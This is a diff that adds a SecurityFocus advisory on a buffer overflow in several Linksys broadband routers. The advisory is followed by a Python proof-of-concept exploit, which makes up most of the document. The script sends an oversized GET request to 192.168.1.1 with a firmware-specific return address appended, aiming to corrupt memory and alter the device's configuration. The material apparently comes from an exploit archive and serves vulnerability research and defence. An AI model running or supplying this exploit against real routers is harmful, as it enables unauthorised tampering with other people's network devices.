@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/6301/info
+
+Several Linksys Broadband Router devices are prone to a buffer overflow conditions.
+
+The vulnerability occurs due to insufficient allocation of memory for buffers. 
+
+An attacker can exploit this vulnerability by issuing an overly long GET request to the vulnerable Linksys device. When the device attempts to process the malformed input, it will be possible to corrupt sensitive memory. This may allow an attacker to change configuration information on the vulnerable device.
+
+import socket
+import struct
+import select
+
+class Exploit:
+def __init__(self):
+pass
+
+def setup(self):
+self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+self.s.connect(('192.168.1.1',80))
+
+self.returnAddress = 0x1834c # 1.43 log(2,"unknown file name!")
+self.returnAddress = 0x175fa # 1.42.7 log(2,"unknown file name!")
+
+self.paddingSize = 1500-20-20+1004+7*4
+# 1500 is MTU
+# 20 IP header
+# 20 TCP header
+# 1004 for allocated space
+# 7 saved registers
+self.toSend = "GET "
+self.toSend += "A"*(self.paddingSize-len(self.toSend))
+self.toSend += struct.pack(">L", self.returnAddress)
+
+def attack(self):
+self.s.send(self.toSend)
+(r,w,x) = select.select([self.s],[],[],2)
+if self.s in r:
+print self.s.recv(100000)
+self.s.close()
+
+def run(self):
+self.setup()
+self.attack()
+
+def main():
+ex = Exploit()
+ex.run()
+
+main()
